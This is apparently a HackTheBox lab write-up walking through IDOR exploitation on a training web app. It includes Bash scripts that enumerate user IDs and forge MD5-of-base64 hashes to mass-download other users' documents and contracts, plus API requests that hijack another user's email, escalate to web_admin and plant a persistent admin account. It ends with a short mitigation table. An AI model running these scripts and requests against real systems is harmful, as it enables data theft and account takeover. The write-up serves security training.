# HTB-Writeup-Insecure-Direct-Object-References
HackTheBox Writeup:  Mass IDOR Enumeration, API exploitation, and privilege escalation.

By Ramyar Daneshgar 



This writeup provides a deep technical walkthrough of how I exploited Insecure Direct Object References (IDOR) in a vulnerable web application. I systematically performed mass enumeration, bypassed encoded references, and achieved API privilege escalation. I used parameter fuzzing, API manipulation, access control evasion, and automated exploitation to escalate my privileges and compromise the application.

1. Mass IDOR Enumeration

Identifying the IDOR Vulnerability

As I began testing the target web application, I noticed that user-specific documents were accessible via a parameterized GET request:

http://SERVER_IP:PORT/documents.php?uid=1

Since the uid parameter was exposed in the URL, I suspected that access control validation might be missing on the backend. To confirm this, I manually changed the uid parameter to see if I could retrieve another user’s documents:

http://SERVER_IP:PORT/documents.php?uid=2

Upon executing this request, I received documents that clearly did not belong to me, confirming an IDOR vulnerability.

Manually Enumerating IDs

As I explored further, I noticed a predictable structure in the document filenames:

<li><a href='/documents/Invoice_2_08_2020.pdf'>Invoice</a></li>
<li><a href='/documents/Report_2_12_2020.pdf'>Report</a></li>

The presence of predictable naming conventions indicated that a forced browsing attack was possible. This meant that I could systematically guess document URLs and gain access to restricted files.

Automating Mass Enumeration

Since manually changing uid values was inefficient, I developed a Bash script to automate bulk extraction:

#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..100}; do  # Iterate through 100 user IDs
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q $url/$link  # Download each document
    done
done

I was able to access confidential documents belonging to multiple users, bypassing access controls entirely.

2. Bypassing Encoded References

Understanding Reference Encoding

Upon further testing, I discovered that certain files were referenced using hashed values instead of numerical IDs. The application used an MD5 hash to obscure object references:

POST /download.php
Content-Type: application/x-www-form-urlencoded

contract=cdd96d3cc73d1dbdaffa03cc6cd7339b

This suggested an attempt at Secure Direct Object Referencing (SDOR) to prevent enumeration. However, I suspected the hash was predictable.

Reverse Engineering the Hashing Mechanism

I examined the front-end JavaScript source code and discovered the hashing logic:

function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}

I realized that the application was generating hashes by:

Base64 encoding the user ID (btoa(uid))

Applying an MD5 hash to the encoded value (CryptoJS.MD5())

Generating Valid Hashes

With this information, I was able to generate my own valid hashes for any given user ID:

for i in {1..100}; do
    echo -n $i | base64 -w 0 | md5sum | tr -d ' -'
done

Automating Exploitation

With a list of valid hashes, I wrote a script to download all contract files:

#!/bin/bash

for i in {1..100}; do
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
done

I successfully retrieved contract files for all users, proving that the encoding mechanism was weak and easily bypassed.

3. IDOR in Insecure APIs

Analyzing API Weaknesses

I intercepted the profile update request in Burp Suite and saw the following PUT API request:

PUT /profile/api.php/profile/1
Content-Type: application/json
Cookie: role=employee

{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb"
}

I immediately noticed a major security flaw—the role value was stored in a client-side cookie (role=employee). Since the server was trusting this cookie for role-based access control, I had an opportunity for privilege escalation.

Privilege Escalation via API Tampering

 Modify Another User’s Profile

I attempted to modify another user’s details by changing the uid in my request:

PUT /profile/api.php/profile/2
Content-Type: application/json
Cookie: role=employee

{
    "uid": 2,
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "full_name": "Hacked User",
    "email": "hacked@employees.htb"
}

 I successfully changed another user’s email, enabling me to take over their account via password reset.

Escalate to Admin Role

I escalated my privileges by modifying my role to web_admin:

PUT /profile/api.php/profile/1
Content-Type: application/json
Cookie: role=employee

{
    "uid": 1,
    "role": "web_admin"
}

 I now had full administrator privileges over the system.

 Create a New Admin Account

To maintain persistence, I created a new admin account:

POST /profile/api.php/profile
Content-Type: application/json
Cookie: role=web_admin

{
    "uid": 100,
    "role": "web_admin",
    "full_name": "Attacker",
    "email": "attacker@employees.htb"
}

 I could now create, delete, and modify any user accounts, achieving total system compromise.

4. Mitigation Strategies

Vulnerability

Mitigation

Mass IDOR Enumeration

Implement Role-Based Access Control (RBAC) and enforce backend validation.

Bypassing Encoded References

Use strong, non-predictable UUIDs instead of simple hashes.

Insecure API Calls

Perform server-side access control checks rather than relying on client-controlled tokens.



